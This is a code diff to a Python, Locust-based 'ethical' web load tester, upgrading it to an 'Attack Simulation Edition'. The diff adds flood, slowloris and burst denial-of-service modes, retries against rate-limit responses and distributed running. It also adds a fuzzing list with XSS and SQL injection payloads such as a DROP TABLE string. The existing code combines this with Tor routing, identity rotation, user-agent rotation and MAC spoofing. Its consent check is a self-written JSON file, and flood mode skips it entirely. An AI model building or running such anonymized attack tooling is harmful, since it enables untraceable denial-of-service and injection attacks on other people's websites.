@@ -34,8 +34,8 @@ logger = logging.getLogger(__name__)
 # Security banner
 SECURITY_BANNER = """
 ╔══════════════════════════════════════════════════════════════╗
-║  ETHICAL WEB LOAD TESTER (EWLT) - Enhanced Security Edition  ║
-║  Version 2.0 - Educational & Self-Testing Only               ║
+║  ETHICAL WEB LOAD TESTER (EWLT) - Attack Simulation Edition  ║
+║  Version 2.1 - Educational & Self-Testing Only               ║
 ╚══════════════════════════════════════════════════════════════╝
 
 ⚠️  LEGAL NOTICE:
@@ -48,6 +48,12 @@ SECURITY_BANNER = """
    • Request timing obfuscation
    • TLS fingerprint randomization
    • DNS leak prevention
+
+🚀 NEW IN v2.1:
+   • Attack modes: flood, slowloris, burst for realistic DDoS sim
+   • Fuzzing payloads for app-layer testing
+   • Enhanced reporting with vuln insights
+   • Retry logic & distributed prep
 """
 
 def check_dependencies():
@@ -81,19 +87,29 @@ import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
-# User agent rotation for anonymity
+# User agent rotation for anonymity (updated for 2025)
 USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
+]
+
+# Fuzzing payloads (ethical, randomized for testing forms)
+FUZZING_PAYLOADS = [
+    "<script>alert('test')</script>",
+    "' OR '1'='1",
+    "'; DROP TABLE users; --",
+    random.choice(["admin", "user", "test"]) + random.choice(["@example.com", ""])  # Benign emails/usernames
 ]
 
 class EnhancedWebsiteUser(HttpUser):
-    """Enhanced user with better anonymity and realistic behavior."""
+    """Enhanced user with attack modes, fuzzing, and retries."""
     wait_time = between(1, 5)
+    attack_mode = 'flood'  # Default
+    enable_fuzzing = False
     
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
@@ -101,6 +117,16 @@ class EnhancedWebsiteUser(HttpUser):
         self.post_data = None
         self.referer = None
         
+        # Add retry strategy
+        retry_strategy = Retry(
+            total=3,
+            backoff_factor=1,
+            status_forcelist=[429, 500, 502, 503, 504]
+        )
+        adapter = HTTPAdapter(max_retries=retry_strategy)
+        self.client.mount("http://", adapter)
+        self.client.mount("https://", adapter)
+    
     def on_start(self):
         """Initialize with random fingerprint."""
         self.client.headers.update({
@@ -118,7 +144,7 @@ class EnhancedWebsiteUser(HttpUser):
     
     @task(10)
     def load_page(self):
-        """Simulate realistic page loads."""
+        """Simulate realistic page loads (base for flood)."""
         path = random.choice(self.target_paths)
         headers = {}
         
@@ -135,8 +161,9 @@ class EnhancedWebsiteUser(HttpUser):
                 else:
                     response.failure(f"Status: {response.status_code}")
                     
-                # Simulate reading time
-                time.sleep(random.uniform(0.5, 2.0))
+                # Simulate reading time (shorter for attacks)
+                read_time = 0.5 if self.attack_mode != 'flood' else random.uniform(0.1, 0.5)
+                time.sleep(read_time)
         except Exception as e:
             logger.error(f"Request failed: {e}")
     
@@ -171,6 +198,92 @@ class EnhancedWebsiteUser(HttpUser):
                         response.failure(f"Status: {response.status_code}")
             except Exception as e:
                 logger.error(f"POST failed: {e}")
+    
+    @task(5)  # High weight for flood mode
+    def flood_attack(self):
+        """High-volume GET/POST flood."""
+        if self.attack_mode != 'flood':
+            return
+        path = random.choice(self.target_paths)
+        method = random.choice([self.client.get, self.client.post]) if self.post_data else self.client.get
+        try:
+            with method(path, data=self.post_data, catch_response=True) as response:
+                if 200 <= response.status_code < 400:
+                    response.success()
+                else:
+                    response.failure(f"Status: {response.status_code}")
+        except Exception as e:
+            logger.error(f"Flood request failed: {e}")
+    
+    @task(8)  # Dominant for slowloris
+    def slowloris_attack(self):
+        """Slow resource-exhausting requests."""
+        if self.attack_mode != 'slowloris':
+            return
+        path = random.choice(self.target_paths)
+        # Chunked slow POST to tie up connections
+        chunk_data = {"slow_key": "a" * 1024}  # Small chunks
+        try:
+            with self.client.post(path, data=chunk_data, timeout=30, catch_response=True) as response:
+                # Simulate slow send by sleeping in loop (Locust handles)
+                time.sleep(random.uniform(5, 10))  # Hold connection
+                if response.status_code in [200, 302]:
+                    response.success()
+                else:
+                    response.failure(f"Status: {response.status_code}")
+        except Exception as e:
+            logger.error(f"Slowloris failed: {e}")
+    
+    @task(6)  # Bursty for burst mode
+    def burst_attack(self):
+        """Rapid burst of requests."""
+        if self.attack_mode != 'burst':
+            return
+        # Fire 5-10 requests in quick succession
+        for _ in range(random.randint(5, 10)):
+            path = random.choice(self.target_paths)
+            try:
+                with self.client.get(path, catch_response=True) as response:
+                    if 200 <= response.status_code < 400:
+                        response.success()
+                    else:
+                        response.failure(f"Status: {response.status_code}")
+                time.sleep(random.uniform(0.01, 0.05))  # Micro-delays
+            except Exception as e:
+                pass
+    
+    @task(2)  # Optional fuzzing
+    def fuzz_form(self):
+        """Fuzz forms with randomized payloads."""
+        if not self.enable_fuzzing:
+            return
+        path = random.choice(self.target_paths)
+        fuzz_payload = random.choice(FUZZING_PAYLOADS)
+        data = {k: fuzz_payload for k in self.post_data.split('&') if '=' in k} if self.post_data else {"input": fuzz_payload}
+        try:
+            with self.client.post(path, data=data, catch_response=True) as response:
+                if response.status_code in [200, 302, 400, 403]:  # Accept some errors as "tested"
+                    response.success()
+                else:
+                    response.failure(f"Status: {response.status_code} (Potential vuln?)")
+        except Exception as e:
+            logger.error(f"Fuzzing failed: {e}")
+
+# Enhanced events for vuln insights
+@events.request.add_listener
+def on_request(request_type, name, response_time, response_length, **kwargs):
+    if response_time > 5000:  # Flag slow responses
+        logger.warning(f"Potential bottleneck: {name} took {response_time}ms")
+
+@events.test_stop.add_listener
+def on_test_stop(environment, **kwargs):
+    stats = environment.stats
+    if stats.total.num_requests > 0:
+        failure_rate = (stats.total.num_failures / stats.total.num_requests) * 100
+        if failure_rate > 20:
+            logger.warning(f"Vuln Alert: High failure rate ({failure_rate:.1f}%) - Enable rate limiting or CAPTCHA?")
+        if stats.total.avg_response_time > 2000:
+            logger.warning("Vuln Alert: Slow avg response - Optimize backend or add CDN?")
 
 class TorManager:
     """Manage Tor process with control port."""
@@ -406,6 +519,23 @@ def setup_proxy_environment(use_tor=False, vpn_proxy=None):
         os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050'
         logger.info("✓ Tor SOCKS5 proxy configured (DNS leak prevention)")
 
+def check_consent_file(consent_file):
+    """Verify consent JSON for ethical use."""
+    if not Path(consent_file).exists():
+        logger.error(f"Consent file not found: {consent_file}")
+        return False
+    try:
+        with open(consent_file, 'r') as f:
+            data = json.load(f)
+        if data.get('permission') != True or data.get('target_owner') != 'me':
+            logger.error("Invalid consent: Must have {'permission': true, 'target_owner': 'me'}")
+            return False
+        logger.info("✓ Consent verified")
+        return True
+    except Exception as e:
+        logger.error(f"Consent check failed: {e}")
+        return False
+
 def run_load_test(args):
     """Execute the load test with all security features."""
     
@@ -414,6 +544,11 @@ def run_load_test(args):
     mac_spoofer = None
     
     try:
+        # Consent check for attack modes
+        if args.attack_mode != 'flood' and not args.dry_run:
+            if not check_consent_file(args.consent_file):
+                return
+        
         # Setup MAC spoofing
         if args.mac_interface:
             mac_spoofer = MACSpoofer(args.mac_interface)
@@ -437,6 +572,7 @@ def run_load_test(args):
         if args.dry_run:
             logger.info("✓ DRY RUN: All systems configured. No traffic sent.")
             logger.info(f"  Target: {args.target_url}")
+            logger.info(f"  Attack Mode: {args.attack_mode}")
             logger.info(f"  Users: {args.users}")
             logger.info(f"  Duration: {args.duration}s")
             return
@@ -444,21 +580,29 @@ def run_load_test(args):
         # Setup Locust environment
         setup_logging("WARNING", None)
         env = Environment(user_classes=[EnhancedWebsiteUser])
-        env.create_local_runner()
+        if args.distributed:
+            from locust.runners import MasterLocustRunner
+            env.create_master_runner()  # Or slave if --slave flag added later
+            logger.info("Distributed mode: Run slaves with 'locust -f web_load_tester.py --slave --master-host=localhost'")
+        else:
+            env.create_local_runner()
         
         # Configure user behavior
         EnhancedWebsiteUser.host = args.target_url
+        EnhancedWebsiteUser.attack_mode = args.attack_mode
+        EnhancedWebsiteUser.enable_fuzzing = args.enable_fuzzing
         if args.target_paths:
             EnhancedWebsiteUser.target_paths = args.target_paths.split(',')
         if args.post_data:
-            EnhancedWebsiteUser.post_data = args.post_data
+            EnhancedWebsiteUser.post_data = {k.split('=')[0]: '='.join(k.split('=')[1:]) for k in args.post_data.split('&')}
         
         # Start test
-        logger.info(f"Starting load test:")
+        logger.info(f"Starting load test (Attack Mode: {args.attack_mode}):")
         logger.info(f"  • Target: {args.target_url}")
         logger.info(f"  • Users: {args.users}")
         logger.info(f"  • Spawn rate: {args.spawn_rate}/s")
         logger.info(f"  • Duration: {args.duration}s")
+        logger.info(f"  • Fuzzing: {'Enabled' if args.enable_fuzzing else 'Disabled'}")
         logger.info(f"  • Anonymity: {'Tor' if args.use_tor else 'VPN' if args.vpn_proxy else 'Direct'}")
         
         env.runner.start(args.users, spawn_rate=args.spawn_rate)
@@ -480,17 +624,19 @@ def run_load_test(args):
         # Stop test
         env.runner.quit()
         
-        # Print results
+        # Enhanced results
         logger.info("\n" + "="*60)
-        logger.info("TEST RESULTS:")
+        logger.info("TEST RESULTS & VULN INSIGHTS:")
         logger.info("="*60)
-        stats = env.stats
-        logger.info(f"Total requests: {stats.total.num_requests}")
-        logger.info(f"Failures: {stats.total.num_failures}")
-        logger.info(f"Average response time: {stats.total.avg_response_time:.2f}ms")
-        logger.info(f"Min response time: {stats.total.min_response_time}ms")
-        logger.info(f"Max response time: {stats.total.max_response_time}ms")
-        logger.info(f"Requests/sec: {stats.total.current_rps:.2f}")
+        stats = env.stats.total
+        logger.info(f"Total requests: {stats.num_requests}")
+        logger.info(f"Failures: {stats.num_failures} ({(stats.num_failures / stats.num_requests * 100):.1f}% if >0)")
+        logger.info(f"Average response time: {stats.avg_response_time:.2f}ms")
+        logger.info(f"Median response time: {stats.median_response_time:.2f}ms")
+        logger.info(f"95th percentile: {stats.get_response_time_percentile(95):.2f}ms")
+        logger.info(f"Min response time: {stats.min_response_time}ms")
+        logger.info(f"Max response time: {stats.max_response_time}ms")
+        logger.info(f"Requests/sec: {stats.current_rps:.2f}")
         logger.info("="*60)
         
     except KeyboardInterrupt:
@@ -510,25 +656,29 @@ def main():
     print(SECURITY_BANNER)
     
     parser = argparse.ArgumentParser(
-        description="Ethical Web Load Tester (EWLT) v2.0 - Enhanced Security Edition",
+        description="Ethical Web Load Tester (EWLT) v2.1 - Attack Simulation Edition",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Basic test (your own site only!)
-  python web_load_tester.py --target-url http://localhost:8080 --users 50
+  # Basic flood test (your own site only!)
+  python web_load_tester.py --target-url http://localhost:8080 --users 50 --attack-mode flood
   
-  # With Tor anonymity
-  python web_load_tester.py --target-url http://yoursite.com --users 100 --use-tor
+  # Slowloris simulation
+  python web_load_tester.py --target-url http://yoursite.com --users 100 --attack-mode slowloris --consent-file consent.json
   
-  # With MAC spoofing (requires sudo/admin)
-  sudo python web_load_tester.py --target-url http://localhost --users 50 --mac-interface eth0
+  # Burst with fuzzing
+  python web_load_tester.py --target-url http://localhost --users 200 --attack-mode burst --enable-fuzzing --post-data "user=test&pass=test"
   
-  # Dry run (test setup without traffic)
-  python web_load_tester.py --target-url http://localhost --dry-run
+  # With Tor & rotation
+  python web_load_tester.py --target-url http://yoursite.com --users 100 --use-tor --identity-rotation 60 --attack-mode flood
   
-  # Full anonymity stack
-  sudo python web_load_tester.py --target-url http://yoursite.com \\
-    --users 100 --use-tor --mac-interface wlan0 --identity-rotation 60
+  # Distributed (run as master)
+  python web_load_tester.py --target-url http://localhost --distributed --users 500
+  
+  # Dry run
+  python web_load_tester.py --target-url http://localhost --dry-run --attack-mode slowloris
+
+Consent file (consent.json): {"permission": true, "target_owner": "me"}
         """
     )
     
@@ -546,7 +696,19 @@ Examples:
     parser.add_argument('--target-paths', 
                        help="Comma-separated paths to test (e.g., /,/about,/products)")
     parser.add_argument('--post-data',
-                       help="POST data for form submissions (e.g., 'username=test&password=test')")
+                       help="POST data for forms/fuzzing (e.g., 'username=test&password=test')")
+    
+    # Attack enhancements
+    parser.add_argument('--attack-mode', choices=['flood', 'slowloris', 'burst'], default='flood',
+                       help="Attack simulation mode (default: flood)")
+    parser.add_argument('--enable-fuzzing', action='store_true',
+                       help="Enable fuzzing payloads for app testing")
+    parser.add_argument('--consent-file',
+                       help="Path to consent JSON (required for advanced modes)")
+    
+    # Distributed
+    parser.add_argument('--distributed', action='store_true',
+                       help="Enable distributed mode (master; use Locust CLI for slaves)")
     
     # Anonymity options
     parser.add_argument('--use-tor', action='store_true',
@@ -575,6 +737,10 @@ Examples:
     if args.check_dns_leak and not args.use_tor:
         logger.warning("DNS leak check requires --use-tor")
         args.check_dns_leak = False
+    
+    if args.attack_mode != 'flood' and not args.consent_file and not args.dry_run:
+        logger.error("Advanced attack modes require --consent-file")
+        return
     
     # Security reminder
     if not args.dry_run:
